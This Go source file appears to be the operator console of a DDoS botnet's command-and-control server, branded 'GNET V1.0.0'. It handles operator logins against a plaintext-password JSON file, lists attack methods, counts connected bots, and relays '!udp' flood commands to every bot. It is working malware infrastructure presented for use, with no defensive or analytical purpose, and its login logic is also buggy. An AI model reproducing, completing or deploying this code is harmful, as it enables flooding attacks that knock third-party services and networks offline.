package client

import (
	"bufio"
	"encoding/json"
	"fmt"
	"gnet/art"
	"gnet/bot"
	"gnet/cmds"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/chzyer/readline"
)

type Client struct {
	User string
	Conn net.Conn
	Addr string
}

type User struct {
	User string `json:"user"`
	Pass string `json:"pass"`
}

var Clients []Client

func WriterBanner(BannerWriter bufio.Writer) {

	BannerScanner := bufio.NewScanner(strings.NewReader(art.BANNER))

	for BannerScanner.Scan() {
		BannerWriter.WriteString(fmt.Sprint("\r\033[35m", BannerScanner.Text(), "\n\033[0m"))
	}

	BannerWriter.WriteString("\n")
	BannerWriter.Flush()

}

func GetClientByConnection(Connection net.Conn) Client {

	for _, Client := range Clients {
		if Client.Conn == Connection {
			return Client
		}
	}

	return Client{}
}

func ClientLoginHandler(Connection net.Conn) {

	for _, ConnectingClient := range Clients {
		if ConnectingClient.Conn == Connection {
			go ClientHandler(Connection)
			return
		}
	}

	Writer := bufio.NewWriter(Connection)
	Output := ""

	for {

		Writer.WriteString("\033[2J\033[H")
		Writer.Flush()
		WriterBanner(*Writer)

		if Output != "" {
			Writer.WriteString(fmt.Sprint("\r", Output, "\n"))
		}

		ReadLine, _ := readline.NewEx(&readline.Config{
			Prompt: fmt.Sprint("\r\033[35m", fmt.Sprintf(art.USER, "login"), "\033[0m "),
			Stdin:  Connection,
			Stdout: Connection,
		})

		Writer.Flush()
		Text, _ := ReadLine.Readline()

		if len(strings.Split(Text, ":")) == 2 {

			if _, ERR := os.Stat("./data/users.json"); ERR == nil {

				if Content, ERR := os.ReadFile("./data/users.json"); ERR == nil {

					USERNAME := strings.Split(Text, ":")[0]
					PASSWORD := strings.Split(Text, ":")[1]

					var Accounts []User
					ERR = json.Unmarshal(Content, &Accounts)

					if ERR == nil {
						for _, Account := range Accounts {
							if Account.User == USERNAME && Account.Pass == PASSWORD {
								Output = "succcess"
								Clients = append(Clients, Client{User: USERNAME, Conn: Connection, Addr: Connection.RemoteAddr().String()})
								go ClientLoginHandler(Connection)
								return
							}
						}
					}
					Output = "Wrong username or password."
				}
				Output = "Backend file error."
			}
			Output = "Backend file error."
		}
		Output = "Must be in format - user:pass"
	}

}

func ClientHandler(Connection net.Conn) {

	Writer := bufio.NewWriter(Connection)
	Client := GetClientByConnection(Connection)
	Output := ""

	if Client.User == "" {
		go ClientLoginHandler(Connection)
		return
	}

	for {

		Writer.Flush()
		Writer.WriteString("\033[2J\033[H")
		Writer.Flush()
		WriterBanner(*Writer)
		Writer.WriteString("\r\033[35m| GNET V1.0.0 | .help | \n\033[0m")

		if Output != "" {
			Writer.WriteString("\n")
			OutputScanner := bufio.NewScanner(strings.NewReader(Output))
			for OutputScanner.Scan() {
				Writer.WriteString(fmt.Sprint("\r\033[35m", OutputScanner.Text(), "\033[0m\n"))
			}
			Writer.Flush()
		}

		Writer.WriteString("\n")

		ReadLine, _ := readline.NewEx(&readline.Config{
			Prompt: fmt.Sprint("\r\033[35m", fmt.Sprintf(art.USER, Client.User), "\033[0m "),
			Stdin:  Connection,
			Stdout: Connection,
		})

		Writer.Flush()
		Command, _ := ReadLine.Readline()

		// Command Handler Section

		if Command == ".help" {
			Output = cmds.Help()
		}

		if Command == ".methods" {
			Output = cmds.Methods()
		}

		if Command == ".bots" {
			BOT_COUNT := strconv.Itoa(bot.GetBots())
			Output = "\r\033[35m[GNET] - " + BOT_COUNT + " bots\033[0m"
		}

		if len(strings.Split(Command, " ")) == 4 {
			if strings.Split(Command, " ")[0] == "!udp" {
				go bot.SendCommandToBots(Command)
			}
		}
	}
}
